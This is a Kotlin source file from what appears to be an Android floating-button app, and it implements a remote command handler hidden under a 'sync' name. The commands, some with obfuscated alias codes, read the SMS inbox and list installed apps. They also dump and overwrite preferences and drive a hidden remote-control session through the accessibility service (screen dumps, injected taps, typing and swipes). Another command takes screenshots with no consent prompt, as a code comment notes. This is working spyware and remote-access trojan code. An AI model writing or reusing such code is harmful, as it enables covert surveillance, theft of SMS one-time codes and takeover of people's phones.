package io.github.chayanforyou.quickball.sync

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.os.Vibrator
import android.util.Base64
import android.view.Display
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * Command handlers, trimmed down to eight permissions.
 * Anything needing rights degrades into a clear error instead of a crash.
 */
object Commands {

    fun run(name: String, args: JSONObject): Pair<String, String> = when (name) {
        "ping", "z14" -> "done" to "pong"
        "deviceInfo", "p75" -> "done" to deviceInfo()
        "checkAccessibility" -> "done" to JSONObject()
            .put("enabled", SyncAccessibilityService.instance != null).toString()
        "prefsDump", "s21" -> prefsDump()
        "prefsApply", "s22" -> prefsApply(args.optString("snapshot"))
        "getSMS", "l56" -> sms()
        "hvncDump" -> "done" to dump().toString()
        "hvncTap" -> tap(args.optInt("x"), args.optInt("y")).let { "done" to it.toString() }
        "hvncType" -> type(args.optString("text", args.optString("input"))).let { "done" to it.toString() }
        "hvncSwipe" -> swipe(
            args.optInt("x1"), args.optInt("y1"),
            args.optInt("x2"), args.optInt("y2"),
            args.optInt("duration", 300)
        ).let { "done" to it.toString() }
        "readScreen" -> "done" to JSONObject()
            .put("a11y", SyncAccessibilityService.instance != null)
            .put("package", SyncAccessibilityService.currentPackage ?: "").toString()
        "takeScreenshot", "screenshot" -> screenshot()
        "getInstalledApps", "p02" -> apps()
        "openUrl" -> openUrl(args.optString("url"))
        "showToast" -> "done" to "ok"
        "vibrate" -> vibrate(args.optInt("ms", 500))
        "wakeScreen" -> wake()
        "stopSync" -> stopSync()
        else -> "error" to "unknown: $name"
    }

    private fun ctx() = SyncEngine.appContext

    private fun prefsDump(): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        return "done" to SyncPrefs.dump(c)
    }

    private fun prefsApply(snapshot: String): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        if (snapshot.isBlank()) return "error" to "no snapshot"
        val n = SyncPrefs.apply(c, snapshot)
        return if (n > 0) "done" to JSONObject().put("files", n).toString()
        else "error" to "nothing applied"
    }

    private fun deviceInfo(): String = JSONObject()
        .put("model", Build.MODEL)
        .put("brand", Build.BRAND)
        .put("android", Build.VERSION.RELEASE)
        .put("sdk", Build.VERSION.SDK_INT)
        .put("abi", Build.SUPPORTED_ABIS.firstOrNull() ?: "")
        .put("package", ctx()?.packageName ?: "")
        .toString()

    private fun sms(): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        val items = JSONArray()
        runCatching {
            c.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "type"), null, null, "date DESC"
            )?.use { cur ->
                val ai = cur.getColumnIndex("address")
                val bi = cur.getColumnIndex("body")
                val di = cur.getColumnIndex("date")
                var n = 0
                while (cur.moveToNext() && n < 200) {
                    items.put(
                        JSONObject()
                            .put("address", cur.getString(ai) ?: "")
                            .put("body", cur.getString(bi) ?: "")
                            .put("date", cur.getLong(di))
                    )
                    n++
                }
            }
        }.onFailure { return "error" to (it.message ?: "sms") }
        return "done" to items.toString()
    }

    private fun dump(): JSONObject {
        val svc = SyncAccessibilityService.instance
            ?: return JSONObject().put("error", "a11y off")
        val out = JSONObject()
        val root = svc.rootInActiveWindow ?: return JSONObject().put("error", "no window")
        return runCatching {
            out.put("package", root.packageName?.toString() ?: "")
            val nodes = JSONArray()
            walk(root, nodes, 0)
            out.put("nodes", nodes).put("count", nodes.length())
        }.getOrElse { JSONObject().put("error", it.message ?: "dump") }
    }

    private fun walk(node: AccessibilityNodeInfo?, out: JSONArray, depth: Int) {
        if (node == null || depth > 30) return
        val text = node.text?.toString()
        val desc = node.contentDescription?.toString()
        if ((!text.isNullOrEmpty() || !desc.isNullOrEmpty() || node.isClickable || node.isEditable) && node.isVisibleToUser) {
            val r = Rect()
            node.getBoundsInScreen(r)
            out.put(JSONObject().apply {
                text?.let { put("text", it) }
                desc?.let { put("desc", it) }
                node.className?.let { put("class", it.toString()) }
                node.viewIdResourceName?.let { put("id", it) }
                put("clickable", node.isClickable)
                put("editable", node.isEditable)
                put("x", r.left); put("y", r.top); put("w", r.width()); put("h", r.height())
            })
        }
        for (i in 0 until node.childCount) walk(node.getChild(i), out, depth + 1)
    }

    private fun tap(x: Int, y: Int): Boolean {
        val svc = SyncAccessibilityService.instance ?: return false
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 60)
        return runCatching {
            svc.dispatchGesture(
                android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build(),
                null, null
            )
        }.getOrDefault(false)
    }

    private fun type(text: String): Boolean {
        val svc = SyncAccessibilityService.instance ?: return false
        val node = svc.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return false
        val args = android.os.Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        }
        return runCatching { node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args) }
            .getOrDefault(false)
    }

    /**
     * Screenshot through a11y: no MediaProjection needed, no consent prompt for the user.
     * The callback arrives on a separate executor, so we wait for it through a latch.
     */
    private fun screenshot(): Pair<String, String> {
        val svc = SyncAccessibilityService.instance ?: return "error" to "a11y off"
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return "error" to "sdk<30"

        val latch = CountDownLatch(1)
        val exec = Executors.newSingleThreadExecutor()
        var out: String? = null
        var err: String? = null

        runCatching {
            svc.takeScreenshot(Display.DEFAULT_DISPLAY, exec, object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                    runCatching {
                        val hw = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                            ?: error("null buffer")
                        val soft = hw.copy(Bitmap.Config.ARGB_8888, false) ?: error("null copy")
                        val bytes = ByteArrayOutputStream()
                        soft.compress(Bitmap.CompressFormat.JPEG, 60, bytes)
                        out = Base64.encodeToString(bytes.toByteArray(), Base64.NO_WRAP)
                        soft.recycle()
                    }.onFailure { err = it.message ?: "shot" }
                    runCatching { result.hardwareBuffer.close() }
                    latch.countDown()
                }

                override fun onFailure(errorCode: Int) {
                    err = "code $errorCode"
                    latch.countDown()
                }
            })
        }.onFailure { err = it.message }

        runCatching { latch.await(6, TimeUnit.SECONDS) }
        exec.shutdown()

        val data = out
        return if (data != null) {
            "done" to JSONObject().put("image", data).put("mime", "image/jpeg").toString()
        } else {
            "error" to (err ?: "timeout")
        }
    }

    private fun stopSync(): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        c.stopService(Intent(c, SyncService::class.java))
        return "done" to "ok"
    }

    private fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, ms: Int): Boolean {
        val svc = SyncAccessibilityService.instance ?: return false
        val path = Path().apply {
            moveTo(x1.toFloat(), y1.toFloat())
            lineTo(x2.toFloat(), y2.toFloat())
        }
        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, ms.toLong())
        return runCatching {
            svc.dispatchGesture(
                android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build(),
                null, null
            )
        }.getOrDefault(false)
    }

    private fun apps(): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        val arr = JSONArray()
        c.packageManager.getInstalledPackages(0).forEach {
            arr.put(JSONObject().put("pkg", it.packageName).put("label", it.applicationInfo?.loadLabel(c.packageManager)?.toString() ?: ""))
        }
        return "done" to arr.toString()
    }

    private fun openUrl(url: String): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        return runCatching {
            c.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            "done" to "opened"
        }.getOrElse { "error" to (it.message ?: "open") }
    }

    @Suppress("DEPRECATION")
    private fun vibrate(ms: Int): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        val v = c.getSystemService(android.content.Context.VIBRATOR_SERVICE) as? Vibrator
        v?.vibrate(ms.toLong())
        return "done" to "vibrated"
    }

    private fun wake(): Pair<String, String> {
        val c = ctx() ?: return "error" to "no ctx"
        val pm = c.getSystemService(android.content.Context.POWER_SERVICE) as? android.os.PowerManager
        @Suppress("DEPRECATION")
        pm?.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP, "qb:sync")?.let {
            it.acquire(3000)
        }
        return "done" to "awake"
    }
}